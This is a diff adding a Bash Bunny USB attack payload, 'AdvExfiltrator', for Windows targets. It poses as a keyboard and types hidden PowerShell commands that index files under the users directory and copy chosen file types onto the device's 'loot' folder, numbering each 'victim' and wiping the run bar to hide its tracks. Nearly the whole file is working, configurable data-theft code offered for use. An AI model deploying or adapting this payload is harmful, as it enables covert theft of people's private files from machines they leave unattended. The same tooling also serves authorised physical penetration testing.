@@ -1,0 +1,128 @@
+#!/bin/bash
+
+# Title			: AdvExfiltrator
+# Author		: GitGitBunny
+# Version		: 1.0
+# Category		: Exfiltration
+# Target		: WIN SP3+
+# Attackmodes	: HID, Storage
+
+# DEPENDENCIES
+# None
+
+# WAY OF WORKING
+# > A victim folder is created
+# > Extensions will be indexed for asset value determination
+# > Files with preffered extension(s) will be copied over to the BashBunny USB style
+
+# LED              # STATUS                                #
+# ---------------- # ------------------------------------- #
+# W solid          # Setting up                            #
+# Y single         # Start indexing files                  #
+# Y double         # Start exfiltration                    #
+# Y triple         # Checking if done                      #
+# G solid          # Succes                                #
+# Red blink        # Fail                                  #
+# ---------------- # ------------------------------------- #
+
+# OPTIONS
+# Enter the extension of the filetype to extract. Samples are: 
+# "\"*.*\"" 			-> for any
+# "\"*.txt\"" 			-> for just one extension
+# "\"*.pdf,*.docx\""	-> for multiple extensions
+EXFILETYPE="\"*.txt\""
+
+# Set to clear the run bar, either "yes" or "no"
+CLEARTRACKS="Y"
+
+# Define the drivename of the storage attackmode, default is "BashBunny"
+DRIVENAME="BashBunny"
+
+# Below are several settings
+FNR=1	#defines the first victim folder number.
+EC=0	#defines the initial error count (EC).
+ET=3	#defines the amount of tries (error threshold (ET)).
+LF=0	#defines the initial setting of the last file (LF) variable.
+
+############################################################
+###                     FUNCTIONS                        ###
+###           Do not edit past these lines               ###
+############################################################
+
+# This function does a count of file extensions and exports them to USB
+function usbCount() {
+	sleep 2
+	Q GUI r
+	Q DELAY 500
+	Q STRING "powershell -WindowStyle Hidden Get-ChildItem C:\\users -Recurse | where { -not \$PSIsContainer } | group Extension -NoElement | sort count -desc > ((gwmi win32_volume -f 'label=''$DRIVENAME''').Name + 'loot\\victim-$FNR\\filecount.log')"
+	Q ENTER
+	sleep 2
+	sync
+	
+	# below is error checking to see if the command worked, if it didn´t it will try again. 
+	if [ -f "/root/udisk/loot/victim-$FNR/filecount.log" ]; then 
+		EC=0
+		LED STAGE2
+		usbExfil
+	elif [ $EC == $ET ]; then 
+		LED R 100
+	else
+		((EC++))
+		usbCount
+	fi
+}
+
+# This function does an exfiltration of the files and exports them to USB. It works by using robocopy, no waiting, no retries, excluding windows folder and the program files folder. There is a delay to prevent checkDone to give a false 'done' 
+function usbExfil() {
+	sleep 2
+	Q GUI r
+	Q DELAY 500
+	Q STRING "powershell -WindowStyle Hidden robocopy C:\\users ((gwmi win32_volume -f 'label=''$DRIVENAME''').Name + 'loot\\victim-$FNR\\') $EXFILETYPE  /s /W:0 /r:0 /xd C:\\windows,C:\\Program"
+	Q ENTER
+	sleep 2
+	if [ $CLEARTRACKS == "Y" ]; then
+	LED M
+	CLEARTRACKS
+	fi
+	LED STAGE3
+	checkDone
+}
+
+# This function will verify if the extract is done by finding the last added file and comparing it to the file found 5 seconds earlier. 
+function checkDone() {
+	NF=$(find /root/udisk/loot -ctime -1 | tail -1);
+	if [ "$LF" == "$NF" ]; then 
+		LED FINISH
+		exit 1
+	else {
+		sleep 5
+		sync
+		LF=$NF
+		checkDone
+	}
+	fi
+}
+
+# This function sets up the folder to extract the files, with a check to make sure that if the directory numbers spin out of control it creates an error.
+function mkFolder() {
+	if [ $FNR -ge 100 ]; then 
+		LED R 100
+	elif [ ! -d "/root/udisk/loot/victim-$FNR" ]; then
+		mkdir /root/udisk/loot/victim-$FNR;
+		sync
+		return 1
+	else 
+		((FNR++))
+		mkFolder
+fi
+}
+
+############################################################
+###                     INITIALIZE                       ###
+###           Do not edit past these lines               ###
+############################################################
+LED W
+mkFolder
+LED STAGE1
+ATTACKMODE HID STORAGE
+usbCount
